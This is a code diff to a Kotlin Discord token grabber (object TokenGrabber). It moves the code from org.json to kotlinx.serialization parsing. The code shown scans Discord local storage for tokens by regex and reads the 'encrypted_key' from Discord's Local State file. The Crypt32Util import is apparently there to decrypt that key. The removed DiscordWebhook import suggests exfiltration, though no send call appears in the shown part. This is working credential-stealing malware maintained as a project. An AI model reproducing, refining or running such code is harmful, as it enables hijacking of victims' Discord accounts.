@@ -1,9 +1,11 @@
 package services.discord
 
 import com.sun.jna.platform.win32.Crypt32Util
-import org.json.JSONObject
-import services.Discord
-import utils.DiscordWebhook
+import kotlinx.serialization.Serializable
+import kotlinx.serialization.decodeFromString
+import kotlinx.serialization.json.Json
+import kotlinx.serialization.json.jsonObject
+import kotlinx.serialization.json.jsonPrimitive
 import java.io.BufferedReader
 import java.io.File
 import java.io.FileReader
@@ -50,7 +52,7 @@ object TokenGrabber {
                 BufferedReader(FileReader(file)).use { br ->
                     var line: String?
                     while (br.readLine().also { line = it } != null) {
-                        if (line!!.contains(regex)) tokens.add(line.split(regex)[1].split("\"")[0])
+                        if (line!!.contains(regex)) tokens.add(line!!.split(regex)[1].split("\"")[0])
                     }
                 }
             }
@@ -58,11 +60,16 @@ object TokenGrabber {
         return tokens
     }
 
+
     private fun getKey(): String? {
         BufferedReader(FileReader(File("$romaing\\discord\\Local State"))).use { brs ->
             var line: String?
             while (brs.readLine().also { line = it } != null) {
-                return JSONObject(line).getJSONObject("os_crypt").getString("encrypted_key")
+                val json = Json.parseToJsonElement(line!!).jsonObject
+                val osCrypt = json["os_crypt"]?.jsonObject
+                val encryptedKey = osCrypt?.get("encrypted_key")?.jsonPrimitive?.content
+
+                return encryptedKey
             }
         }
         return null
